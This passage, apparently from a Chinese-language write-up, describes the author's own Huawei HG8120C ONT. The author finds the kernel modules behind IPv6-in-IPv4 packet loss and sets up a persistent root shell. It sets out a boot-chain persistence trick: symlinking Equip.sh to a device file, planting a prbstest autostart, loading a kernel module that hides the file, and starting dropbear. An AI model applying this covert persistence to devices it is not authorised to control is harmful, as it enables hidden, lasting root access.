+这天，下定决心要把整个lsmod列出的所以模块都检查一遍，一边运行ping6 ipv6.google.com，一边一个一个模块进行移除，观察ping6反馈的结果。
+这个过程进行得十分缓慢，原因是许多模块的卸载过程会导致随机重启，模块数量有上百个，而且引用关系复杂。
+</p>
+<div class="example">
+<pre class="example">WAP(Dopra Linux) # lsmod|wc -l
+119
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每当随机重启后，只能将有依赖关系的模块重新卸载，才能继续，很可能又会很快导致随机重启，近乎死循环。
+但是好歹还是慢慢向前推进着。当进行到l3sfwd_ipv6这个模块时，感觉很像罪魁祸首，因为名字中带ipv6，
+可以肯定和IPv6有关，fwd也像是单词forward（转发）缩写，l3看起来像是指layer 3，那个错误转发也确实是发生在三层上，一切看起来都能说得通。
+然而移除l3sfwd_ipv6之后问题依旧。没办法，只能继续检查剩下的模块，在移除了l3sfwd模块后，丢包现象消失了。
+费了九牛二虎之力终于找到罪魁祸首了，这个罪恶模块应该是和IPv4转发相关的，毕竟IPv6-in-IPv4还是IPv4协议。
+为了进一步确定不是多个模块组合造成的丢包，重启设备后，只移除l3sfwd和两个依赖模块l3sfwd_ipv6和rawip_adpt，
+丢包问题消失，并且也不影响网络和电话功能，一切都很正常，哈哈哈哈！虽然找到了问题的根源，但如何保证设备掉电重启后，
+自动移除这三个引起问题的模块呢？新的问题又来了，不能高兴得太早。
+</p>
+<hr>
+<a name="g_t_6301_4e45root-shell"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_5982_4f55_5b9e_73b0_81ea_542f_52a8" accesskey="n" rel="next">如何实现自启动</a>, Previous: <a href="#g_t_67e5_627eIPv6_002din_002dIPv4_4e22_5305_7684_7f6a_9b41_7978_9996" accesskey="p" rel="prev">查找IPv6-in-IPv4丢包的罪魁祸首</a>, Up: <a href="#HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305" accesskey="u" rel="up">HG8120C 持久 root shell 及完美解决 IPv6 丢包</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Chi-Jiu-root-shell"></a>
+<h3 class="section">4.2 持久root shell</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之前获取的root shell，都只是在内存tmpfs中操作，设备重启后将消失。设备在/mnt/jffs2上挂载了闪存文件系统ubifs（没错，是ubifs，不是jffs2），
+可读写，用于保存设备的配置文件等信息。虽然可以将root shell所需的文件保存在这个路径下，即使设备掉电文件也不会消失，但还必须找到方法，实现自启动，root shell才能持久。
+</p>
+<hr>
+<a name="g_t_5982_4f55_5b9e_73b0_81ea_542f_52a8"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_5bfb_627e_53ef_80fd_88ab_8bf1_5bfc_7684_7a0b_5e8f" accesskey="n" rel="next">寻找可能被诱导的程序</a>, Previous: <a href="#g_t_6301_4e45root-shell" accesskey="p" rel="prev">持久root shell</a>, Up: <a href="#HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305" accesskey="u" rel="up">HG8120C 持久 root shell 及完美解决 IPv6 丢包</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Ru-He-Shi-Xian-Zi-Qi-Dong-"></a>
+<h3 class="section">4.3 如何实现自启动</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实现自启动最容易想到的办法就是修改/etc/rc.d下的启动脚本，添加启动命令到其中。虽然最容易想到，但并不代表最容易实现。
+首先/etc/rc.d位于根文件系统中，而根文件系统使用的是squashfs只读文件系统。其次修改根文件系统风险比较高，不能fail safe，一旦根文件系统损坏，设备可能就变砖，
+对于在线正在使用中的网络设备，高风险的变砖情况是不可接受的，一旦变砖网络和电话就都瘫痪了。
+其实，HG8120C这个设备实现了双系统，但目前不知道如何操作才能保证在修改一个系统的根文件系统导致启动失败的情况下，如何自动或手动切换到另一个正常系统。
+综上所述，我需要找到一个低风险，fail safe的添加自启动的方法。
+唯一符合这样条件的自启动方案，就是将启动命令文件存储在/mnt/jffs2路径下，诱导某个系统程序在启动过程中来执行之，这样可以避免损坏rootfs。
+</p>
+<hr>
+<a name="g_t_5bfb_627e_53ef_80fd_88ab_8bf1_5bfc_7684_7a0b_5e8f"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_6301_4e45-VS-_4fdd_6301_7cfb_7edf_539f_6709_884c_4e3a" accesskey="n" rel="next">持久 VS 保持系统原有行为</a>, Previous: <a href="#g_t_5982_4f55_5b9e_73b0_81ea_542f_52a8" accesskey="p" rel="prev">如何实现自启动</a>, Up: <a href="#HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305" accesskey="u" rel="up">HG8120C 持久 root shell 及完美解决 IPv6 丢包</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Xun-Zhao-Ke-Neng-Bei-You-Dao-De-Cheng-Xu-"></a>
+<h3 class="section">4.4 寻找可能被诱导的程序</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;跟随系统的启动脚本流程，仔细检查每个可能的切入点。
+最先发现可能的切入点在/etc/rc.d/rc.start/1.sdk_init.sh的第76行，如果文件/mnt/jffs2/Equip.sh存在，就运行/bin/Equip.sh，运行成功之后就退出。
+</p>
+<div class="example">
+<pre class="example">76  [ -f /mnt/jffs2/Equip.sh ] &amp;&amp; /bin/Equip.sh &amp;&amp; exit
+</pre></div>
+
+<p>继续查看/bin/Equip.sh，发现文件最后一行会执行/mnt/jffs2路径下的某个程序：
+</p>
+<div class="example">
+<pre class="example">/mnt/jffs2/equipment/bin/aging &amp;
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;乍一看，这个看似可以被利用来执行我们指定的程序/mnt/jffs2/equipment/bin/aging，
+但是对比1.sdk_init.sh后续的启动命令和/bin/Equip.sh发现有太多差异，恐怕启动后设备功能不正常。
+所以只能当作最后的救命稻草，只有在找不到其他更好的切入点时才会使用。继续检查1.sdk_init.sh，426行代码如下：
+</p>
+<div class="example">
+<pre class="example">426 #start for hw_ldsp_cfg进行单板差异化配置，必须放在前面启动
+427 iLoop=0
+428 echo -n &quot;Start ldsp_user...&quot;
+429 if [ -e /bin/hw_ldsp_cfg ]
+430 then
+431   hw_ldsp_cfg &amp;
+432   while [ $iLoop -lt 50 ] &amp;&amp; [ ! -e /var/hw_ldsp_tmp.txt ]
+433   do
+434     #echo $iLoop
+435     iLoop=$(( $iLoop + 1 ))
+436     sleep 0.1
+437   done
+438
+439   if [ -e /var/hw_ldsp_tmp.txt ]
+440   then
+441       rm -rf /var/hw_ldsp_tmp.txt
+442   fi
+443 fi
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这几行代码的意思是执行/bin/hw_ldsp_cfg并等待某个标志文件的创建，等待超时5秒。
+分析/bin/hw_ldsp_cfg发现，如果/mnt/jffs2/Equip.sh和/mnt/jffs2/flashtest两个文件同时都存在的情况下，
+会执行这个/mnt/jffs2/equipment/bin/prbstest程序，这三个文件都位于/mnt/jffs2路径下，都能被我们控制，
+同时也没有改变1.sdk_init.sh中后续的正常启动流程，所以这是一个很好的候选者。
+利用/bin/hw_ldsp_cfg来执行/mnt/jffs2/equipment/bin/prbstest需要满足的两个条件，
+其中一个是/mnt/jffs2/Equip.sh，而这个文件存在表明设备处于“装备模式”，grep后发现系统中很多程序在“装备模式”下，
+行为都会发生改变，这会增加太多的不确定性，所以当我们利用/mnt/jffs2/Equip.sh启动我们的程序后，需要将此文件删除，
+尽可能保持系统原来的行为。同时也注意到/mnt/jffs2/Equip.sh也是上面我们最后救命稻草的启动条件，也就是说如果文件存在，
+启动流程压根就不会走到1.sdk_init.sh的426行，该如何解决这个冲突呢？hw_ldsp_cfg是elf文件，使用open系统调用检查文件的存在性，
+而1.sdk_ini.sh76行使用shell脚本的[ -f /mnt/jffs2/Equip.sh]来测试存在并且是普通文件。“普通文件”这个条件比单纯的系统调用open更加严格，
+对设备文件等特殊文件来说[ -f ... ]会失败，但open调用不会，所以如果在路径/mnt/jffs2/Equip.sh创建一个设备文件或管道等非普通文件，
+就可以达到我们的目的。
+上述利用看起来能够完美工作，即不改变额外的系统原有行为，也达到了启动我们程序的目的。
+确实很完美，但只能完美工作一次，第二次设备重启后就不会工作了，因为为了尽可能保持系统原有行为，/mnt/jffs2/Equip.sh已经被我们删除了，避免启用设备的“装备模式”行为。
+</p>
+<hr>
+<a name="g_t_6301_4e45-VS-_4fdd_6301_7cfb_7edf_539f_6709_884c_4e3a"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_5b8c_6574_6d41_7a0b" accesskey="n" rel="next">完整流程</a>, Previous: <a href="#g_t_5bfb_627e_53ef_80fd_88ab_8bf1_5bfc_7684_7a0b_5e8f" accesskey="p" rel="prev">寻找可能被诱导的程序</a>, Up: <a href="#HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305" accesskey="u" rel="up">HG8120C 持久 root shell 及完美解决 IPv6 丢包</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Chi-Jiu--VS-Bao-Chi-Xi-Tong-Yuan-You-Xing-Wei-"></a>
+<h3 class="section">4.5 持久 VS 保持系统原有行为</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;自启动要持久，特殊文件/mnt/jffs2/Equip.sh就必须保留在ubifs文件系统上，
+保证设备重启后继续存在，但要保持系统原有行为就又必须使得/mnt/jffs2/Equip.sh不存在，
+设备不处于“装备模式”，两者完全对立。想到的办法就是当我们的程序运行起来后，插入一个内核模块，
+劫持对ubifs文件系统的访问，将/mnt/jffs2/Equip.sh隐藏起来，但实际文件还存在，
+重启后到插入我们的劫持模块前文件是可见的，这样便能使得“持久”和“保持系统原有行为”很好的共存了。
+详细可参考劫持模块源代码hijack.c。
+</p>
+<hr>
+<a name="g_t_5b8c_6574_6d41_7a0b"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_603b_7ed3" accesskey="n" rel="next">总结</a>, Previous: <a href="#g_t_6301_4e45-VS-_4fdd_6301_7cfb_7edf_539f_6709_884c_4e3a" accesskey="p" rel="prev">持久 VS 保持系统原有行为</a>, Up: <a href="#HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305" accesskey="u" rel="up">HG8120C 持久 root shell 及完美解决 IPv6 丢包</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Wan-Zheng-Liu-Cheng-"></a>
+<h3 class="section">4.6 完整流程</h3>
+
+<div class="example">
+<pre class="example">1. 创建符号链接/mnt/jffs2/Equip.sh，将其指向设备文件/dev/mtd2ro，这样保证[ -f /mnt/jffs2/Equip.sh]失败。
+2. 创建空文件/mnt/jffs2/flashtest。
+3. 创建自启动文件/mnt/jffss/equipment/bin/prbstest，在其中实现：
+    (1) 检查failsafe文件是否存在，如果存在立即退出，保证如果因为插入hijack劫持模块或卸载模块导致系统重启后不再继续我们的自启动，打破重启循环。
+    (2) 创建failsafe文件。
+    (3) 插入劫持模块hijack.ko，用于中断符号链接/mnt/jffs2/Equip.sh的follow link，保证open等系统调用失败，保持原有系统行为。
+    (4) 移除l3sfwd_ipv6，rawip_adpt和l3sfwd三个模块，解决IPv6-in-IPv4丢包问题。
+    (5) 启动dropbear，实现持久root shell。
+    (6) 启动正常，移除failsafe文件，保证下次重启后自启动继续得到执行。
+</pre></div>
+
+<hr>
+<a name="g_t_603b_7ed3"></a>
+<div class="header">
+<p>
+Previous: <a href="#g_t_5b8c_6574_6d41_7a0b" accesskey="p" rel="prev">完整流程</a>, Up: <a href="#HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305" accesskey="u" rel="up">HG8120C 持久 root shell 及完美解决 IPv6 丢包</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Zong-Jie-"></a>
+<h3 class="section">4.7 总结</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;至此，HG8120C ONT上IPv6-in-IPv4丢包问题算是正式完美解决了，
+由于是在线设备，所以一切操作都选择了风险较小的做法，而不是高风险直接修改rootfs的方法，保证fail safe，保证不损坏设备，
+网络和电话功能正常，额外还收获持久的设备root访问权限。
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于自启动逻辑中的fail safe，实际重启测试中，
+未发现插入或移除内核模块导致重启的情况，但是还是以防万一，毕竟小心行得万年船，
+避免任何不必要的风险。
+</p>
+<hr>
+
+
+
+</body>
+</html>
